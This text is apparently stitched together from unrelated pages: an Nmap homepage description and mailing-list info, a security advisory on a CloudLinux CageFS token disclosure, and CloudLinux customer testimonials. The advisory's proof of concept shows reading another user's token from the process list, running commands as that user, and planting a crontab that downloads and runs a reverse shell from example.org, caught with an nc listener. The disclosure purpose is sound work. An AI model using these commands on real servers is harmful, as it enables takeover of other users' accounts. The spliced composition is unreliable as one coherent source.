# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

# CloudLinux CageFS Token Disclosure

## Vulnerability Overview

CloudLinux CageFS 7.1.1-1 or below passes the authentication token as a
command line argument. In some configurations this allows local users to
view the authentication token via the process list and gain code execution
as another user.

## Impact

If the `lve_namespaces` service or the virtualized proc filesystem
feature is disabled, a local user can obtain the CageFS authentication
token of other users by exploiting the vulnerability documented in this
advisory. In most configurations this allows attackers to gain code
execution as those users.

## Vulnerability Description

CloudLinux offers a feature called proxy commands in CageFS environments.
It allows limited execution of commands outside the CageFS environment from
a user restricted within the CageFS envinronment.

For this purpose a CageFS daemon runs outside of the CageFS environment,
it is accessible via a UNIX socket from within the CageFS environment.
The UNIX socket is handled by `proxyexec`. To make the whole process of
calling a tool outside of the CageFS transparent to the user, wrapper
scripts are placed within CageFS, which in turn call `proxyexec` for
execution of the commands outside of the CageFS environment.

Those wrapper scripts read the CageFS token from `/var/.cagefs/.cagefs.token`
and pass it to the `proxyexec` command as a command line argument.

CloudLinux by default enables the virtualized proc filesystem, which
prevents other users from seeing the CageFS token within the process
list. However, if the `lve_namespaces` service is disabled, e.g. the
systemd unit is masked out, or the virtualized proc filesystem is
explicitly disabled, other users can see the CageFS token within the
process list. They can use the CageFS token of other users to talk to
the CageFS daemon via `proxyexec` and the CageFS daemon executes the
commands with the privileges of the supplied authentication token.

## Proof of Concept

Let's assume, the `lve_namespaces` service is disabled and we are user
`ftp2406151`:

```
$ id
uid=935(ftp2406151) gid=935(site2406151) groups=935(site2406151)
```

We list the process list and find another user executing `ping example.org`:

```
$ ps aux | grep proxyexec
 2094 root      0:00 /usr/sbin/proxyexec -q -d -s /var/lib/proxyexec/cagefs.sock/socket /bin/cagefs.server
1180646 934       0:00 /usr/sbin/proxyexec -c cagefs.sock ftp1488781 EjlVbSK63ye6dtHs / PING 1180642 example.org
1180647 root      0:00 /usr/sbin/proxyexec -q -d -s /var/lib/proxyexec/cagefs.sock/socket /bin/cagefs.server
1181229 ftp24061  0:00 grep proxyexec
```

We now can execute commands as user `ftp1488781` and, for example, view
the crontab:

```
$ /usr/sbin/proxyexec -c cagefs.sock ftp1488781 EjlVbSK63ye6dtHs / CRONTAB_LIST 0
no crontab for ftp1488781
```

Now we setup a new crontab entry, which downloads a reverse shell and
executes it every minute:

```
$ echo '* * * * * wget -q -O rshell https://www.example.org/rshell && chmod +x rshell && nohup ./rshell &' | /usr/sbin/proxyexec -c cagefs.sock ftp1488781 EjlVbSK63ye6dtHs / CRONTAB_SAVE 0
```

```
$ /usr/sbin/proxyexec -c cagefs.sock ftp1488781 EjlVbSK63ye6dtHs / CRONTAB_LIST 0
* * * * * wget -q -O rshell https://www.example.org/rshell && chmod +x rshell && nohup ./rshell &
```

Our shell connects back to us and we can execute arbitrary commands as
the other user:

```
$ nc -l -p 1234
id
uid=934(ftp1488781) gid=934(site1488781) groups=934(site1488781)
```

## Recommended Countermeasures

We recommend to avoid passing sensitive information as a command line
argument. Instead, `proxyexec` should directly read the CageFS token
from the file `/var/.cagefs/.cagefs.token` and pass it to the CageFS
daemon via the UNIX socket.

## You’re in good company

4,000+ companies trust CloudLinux to run more than 20 million of customer websites.

As a managed hosting provider we are always looking for quality products that will help us increase efficiency and stability as well as improve the overall performance from our servers. We deployed CloudLinux on our shared hosting servers, and we have seen an immediate improvement in reliability. Now we want to offer the same solution to our dedicated server customers.

Emmanuel Vivar, CEO

I installed [CloudLinux OS] on Sunday night. It was pretty easy. I’m also amazed at how much it has brought our CPU usage down. I thought caging the different accounts in a virtual environment would put more of a load on our server, but this has done the opposite. Before, our total CPU usage was between 50 – 90% during the day and now it is around 6 – 30%. I’m not sure how or what did this, but I’ll take it! Thank you…

We’ve been really stable selling shared hosting and CloudLinux did it for us (after a number of battles trying to solve the hiccup)! It was like magic!

Ahmad Mukoshy, Founder

I´m running this company for 20 years, we use many vendors in the market and I’m using CloudLinux services for only one week. What I can say is: you have the BEST support service from the whole industry. You guys just rock!

Diogo Lopes, CEO

This is the equivalent of changing the engine on an airplane while it’s flying. I think this will be viewed as a no-brainer purchase when you consider the cost of less than $50 annually per server for having the protection of kernel security updates without downtime.

A lot of hosters are finding their niche, but if you are a “generic” hosting company, you have to focus on the quality of service and monetization. CloudLinux is here to help your business grow and expand.
